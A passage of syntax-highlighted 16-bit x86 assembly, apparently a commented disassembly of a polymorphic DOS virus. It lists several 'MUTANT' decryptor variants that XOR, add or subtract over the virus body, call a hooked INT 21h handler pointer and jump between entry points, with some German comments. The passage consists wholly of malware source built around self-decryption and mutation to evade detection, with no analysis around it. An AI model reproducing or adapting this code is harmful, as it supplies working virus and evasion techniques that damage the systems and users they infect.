                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">2386h</span><span class="sc0">       </span><span class="sc1">; CX = 2386</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">; CX = 2384</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
</span><span class="sc5">J041D3</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">0E8h</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J041D3</span><span class="sc0">
                               </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">008Fh</span><span class="sc0">       </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J041E7</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc5">J041E7</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc5">JMP_entry</span><span class="sc0"> </span><span class="sc2">25</span><span class="sc4">,</span><span class="sc5">mut_25</span><span class="sc0">

</span><span class="sc5">J041EC</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J041C5</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">33h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=====================================================( MUTANT #4 )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">mut_4</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">                      </span><span class="sc1">; = OFFSET 4BB5</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">-</span><span class="sc2">01</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">J041F4</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">DH</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc8">DL</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J041F4</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">STI</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; CALL Int 21</span><span class="sc0">
        </span><span class="sc1">;----( einsprung )----</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J0420D</span><span class="sc0">
</span><span class="sc5">J0420A</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
</span><span class="sc5">J0420D</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BH</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">              </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">23A1h</span><span class="sc0">        </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">02h</span><span class="sc0">         </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">2485h</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CH</span><span class="sc0">              </span><span class="sc1">; CX = 2385</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
</span><span class="sc5">J04220</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">-</span><span class="sc2">01h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J04220</span><span class="sc0">
                                </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">008Eh</span><span class="sc0">        </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J04235</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc5">J04235</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc5">JMP_ENTRY</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc5">mut_4</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;====================================================( MUTANT #13 )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">mut_13</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">                      </span><span class="sc1">; = OFFSET 4BB5</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">-</span><span class="sc2">01h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">J04240</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">DH</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc8">DH</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J04240</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">2567h</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc1">;--------( einsprung ) ------</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J04258</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
</span><span class="sc5">J04258</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">1876h</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">Code_start</span><span class="sc0">   </span><span class="sc1">; BX = 2830</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">Code_Len</span><span class="sc0">     </span><span class="sc1">; CX = 2385 wal-size</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
</span><span class="sc5">J04267</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">-</span><span class="sc2">01h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J04267</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">008Eh</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J0427C</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc5">J0427E</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">     </span><span class="sc1">; SPRUNGZIEL FöR M#19, zeigt auf L0L0L0</span><span class="sc0">
</span><span class="sc5">J0427C</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc5">JMP_ENTRY</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc5">mut_13</span><span class="sc0">

                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0CE8BH</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">05605H</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">34H</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;====================================================( MUTANT # 19)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">mut_19</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; = OFFSET 4BB5</span><span class="sc0">
</span><span class="sc5">J04289</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">05h</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J04289</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">STD</span><span class="sc0">
                </span><span class="sc6">STC</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">XLAT</span><span class="sc0">                            </span><span class="sc1">; MOV AL,[BX+AL]</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; CALL INT 21h</span><span class="sc0">
        </span><span class="sc1">;-------( einsprung )--------------</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J042A5</span><span class="sc0">

</span><span class="sc5">J042A2</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">5601h</span><span class="sc0">
</span><span class="sc5">J042A5</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">              </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">239Fh</span><span class="sc0">        </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">8934h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">code_len</span><span class="sc0">     </span><span class="sc1">; CX = 2385</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">              </span><span class="sc1">; DS=CS !</span><span class="sc0">
</span><span class="sc5">J042B9</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">05h</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J042B9</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0023h</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">008Eh</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J0427E</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc5">JMP_ENTRY</span><span class="sc0"> </span><span class="sc2">19</span><span class="sc4">,</span><span class="sc5">mut_19</span><span class="sc0">

                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0FBC3h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=====================================================( MUTANT #2 )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">Mut_2</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; = OFFSET 4BB5</span><span class="sc0">
                </span><span class="sc6">XLAT</span><span class="sc0">                            </span><span class="sc1">; MOV AL,[BX+AL]</span><span class="sc0">
</span><span class="sc5">J042D6</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J042D6</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">@INT21</span><span class="sc0">
                </span><span class="sc6">CLC</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; CALL Int 21</span><span class="sc0">
                </span><span class="sc6">CLC</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc1">;-------( einsprung )--------------</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J04317</span><span class="sc0">

</span><span class="sc5">J042EE</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">239Fh</span><span class="sc0">        </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">2387h</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">STC</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">              </span><span class="sc1">; CX = 2385</span><span class="sc0">

</span><span class="sc5">J042F8</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J042F8</span><span class="sc0">
                                </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">008Eh</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J0430D</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">J0430E</span><span class="sc0">

</span><span class="sc5">J0430D</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc5">J0430E</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">CLC</span><span class="sc0">
                </span><span class="sc5">JMP_ENTRY</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc5">mut_2</span><span class="sc0">
                </span><span class="sc1">;----------------</span><span class="sc0">
</span><span class="sc5">J04317</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">STC</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">CLC</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;======================================================( MUTANT #9)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">Mut_9</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">J04320</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">05h</span><span class="sc0">    </span><span class="sc1">; = OFFSET 4BB5</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J04320</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">@INT21</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; CALL INT 21</span><span class="sc0">
                </span><span class="sc6">CLC</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">NOP</span><span class="sc0">
